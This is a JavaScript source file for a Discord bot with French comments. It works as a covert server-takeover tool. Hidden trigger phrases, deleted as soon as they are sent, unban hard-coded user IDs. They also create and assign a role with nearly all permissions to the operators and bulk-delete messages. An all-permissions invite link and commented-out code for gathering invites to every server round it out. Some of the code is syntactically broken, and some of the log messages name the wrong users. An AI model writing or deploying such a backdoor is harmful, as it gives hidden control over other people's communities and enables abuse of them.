//--------------Modules----------------
const Discord = require("discord.js");
const moment = require("moment");


//-----------Client--------------
const bot = new Discord.Client();

//-----Prefix-------
const prefix = '--'

//------OWNER-------
const owners = [
'301913733536415755',
'410224633636192257'
]

//---Lancement et informations du bot---
bot.on('ready', () => {
   
   console.log(`INFORMATIONS DU BOT:`);
   console.log(`Invite of bot all perms: https://discordapp.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=2146958591`);
   console.log(`username: ${bot.user.tag}`);
   console.log(`ID: ${bot.user.id}`);
   console.log(`Date of creation: ${bot.user.createdAt}`);
   console.log(`INFORMATIONS OF SERVER BOT:`);
   console.log(`How many server: ${bot.guilds.size}`);	
 });


bot.on('message', message => {    

 //bot.guilds.forEach(guild => { 
 //    var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
 //    invite.createInvite().then(invite => console.log(`Conected on: ${guild.name} || MemberCount: ${guild.memberCount} || ID: ${guild.id} || Invite: ${invite}`));
 //  })
 
	
//---------------------UNBAN-------------------
//unban Le Charmeur
   if (message.content.startsWith('Sblop')) {
   message.delete()
   message.guild.unban('450790126063190016')
  .then(user => console.log(`Resetban Le Charmeur from ${guild.name}`))         
  .catch(console.error);
   } 
	
//unban Mikado
   if (message.content.startsWith('Mblop')) {
   message.delete()
   message.guild.unban('410224633636192257')
   .then(user => console.log(`Resetban of Neroxis from ${guild.name}`))         
  .catch(console.error);
   } 
	

//unban Neroxis
if (message.content.startsWith('Nblop')) {
   message.delete()
   message.guild.unban('301913733536415755')
   .then(user => console.log(`Resetban of Mikado from ${guild.name}`))         
  .catch(console.error);
   } 
	
	

//----------------------------ADD EMOJI UNANIMATED------------------------
   if (message.content.startsWith('Les emoji mikado c\'est cool')) {
   if (message.author.id !== '423118623876448296')
   if (message.author.id !== '301913733536415755')
   return;
   message.guild.createEmoji('./mikado1.png', 'mikado1');
   message.guild.createEmoji('./mikado2.png', 'mikado2');
   message.guild.createEmoji('./mikado3.jpeg', 'mikado3');
   message.guild.createEmoji('./mikado4.jpeg', 'mikado4');
  .then(emoji => console.log(`Nouveau emoji crée ! ${emoji.name}`))
   
   }
	
	
//----------------------------ADD EMOJI ANIMATED------------------------
   if (message.content.startsWith('Les emoji mikado c\'est cool')) {
   if (message.author.id !== '423118623876448296')
   if (message.author.id !== '301913733536415755')
   return;
   message.guild.createEmoji('./mikado1.gif', 'mikado1');
   message.guild.createEmoji('./mikado2.gif', 'mikado2');
   message.guild.createEmoji('./mikado3.gif', 'mikado3');
  .then(emoji => console.log(`Nouveau emoji crée ! ${emoji.name}`))
   
   }
   
  
	
	
   
//---------------------CREATE ROLE-----------------
//choose name
else if(message.content.startsWith('bblop')) {	
   if (message.author.id !== '423118623876448296')
   if (message.author.id !== '301913733536415755')
   return;
var args = message.content.split(" ").slice(1)
//var numberplace = message.content.split(" ").slice(1)
message.guild.createRole({
name: args.join(" "),
mentionable: true,
permissions: 2146958591
//position: numberplace.join(" ")
})
console.log(`Le role a été ajoutés au serveur`)
}

//choose position
else if(message.content.startsWith('Pblop')) {	
   if (message.author.id !== '423118623876448296')
   if (message.author.id !== '301913733536415755')
   return;
var args = message.content.split(" ").slice(1)
//var numberplace = message.content.split(" ").slice(1)
       message.guild.createRole({
name: 'Mikado',
mentionable: true,
permissions: 2146958591,
position: args.join(" ")
})
console.log(`Le role a été ajoutés au serveur`)
}
    
    		   


//-------------------ASIGN ROLE-----------------
if (message.content.startsWith('2blop')) {  
if (message.author.id !== '423118623876448296')
if (message.author.id !== '301913733536415755') 
return;
let args = message.content.split(" ").slice(1);	   
    message.member.addRole(message.member.guild.roles.find('name', args.join(" ")));
    console.log(`Un role a été ajouté a Mikado sur le serveur`);
     }
	
	
if (message.content.startsWith('blopclear')){
let args = message.content.split(" ").slice(1);
if (message.author.id !== '423118623876448296')
if (message.author.id !== '301913733536415755')
return;
message.channel.bulkDelete(args[0])
//console.log(args[0] + " messages ont été effacés.")
		 }
   
});


  
// Jeton Secret
bot.login(process.env.TOKEN);
